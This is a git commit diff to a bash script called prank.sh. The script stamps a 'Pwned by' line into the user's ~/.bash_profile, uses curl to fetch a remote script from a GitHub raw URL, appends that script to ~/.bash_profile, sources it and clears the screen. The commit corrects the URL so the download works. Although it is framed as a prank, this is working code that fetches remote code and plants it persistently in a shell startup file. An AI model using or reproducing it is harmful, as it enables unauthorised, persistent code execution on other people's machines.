524d6c7fe839f0fee8ca5b68133d5dfed25dc9ca
Beau Bouchard <bnb2011@gmail.com>
2016-05-17 17:28:38 -0400

    Update prank.sh

--- prank.sh
+++ prank.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 # This isn't funny
 echo "# Pwned by Beau @ `date`" >> ~/.bash_profile
-curl https://github.com/BeauBouchard/prank/blob/master/newbashprofile.sh >> ~/.bash_profile
+curl https://raw.githubusercontent.com/BeauBouchard/prank/master/newbashprofile.sh >> ~/.bash_profile
 source ~/.bash_profile
 clear
